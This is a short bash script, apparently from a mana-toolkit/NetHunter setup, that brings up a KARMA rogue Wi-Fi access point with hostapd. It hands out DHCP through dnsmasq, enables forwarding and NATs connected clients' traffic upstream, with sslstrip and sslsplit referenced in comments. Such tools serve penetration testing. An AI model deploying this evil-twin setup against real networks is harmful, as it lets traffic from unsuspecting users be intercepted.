#!/bin/bash

upstream=wlan0
phy=wlan1
conf=/sdcard/nh_files/configs/hostapd-karma.conf
hostapd=/usr/lib/mana-toolkit/hostapd

#service network-manager stop
rfkill unblock wlan

ifconfig $phy up

sed -i "s/^interface=.*$/interface=$phy/" $conf
$hostapd $conf&
sleep 5
ifconfig $phy 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
#dhcpd -cf /etc/mana-toolkit/dhcpd.conf $phy

echo '1' > /proc/sys/net/ipv4/ip_forward
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables -F
iptables -t nat -F
iptables -t nat -A POSTROUTING -o $upstream -j MASQUERADE
iptables -A FORWARD -i $phy -o $upstream -j ACCEPT

#echo "Hit enter to kill me"
#read
#pkill dhcpd
#pkill sslstrip
#pkill sslsplit
#pkill hostapd
#pkill python
pkill dnsmasq
#iptables -t nat -F
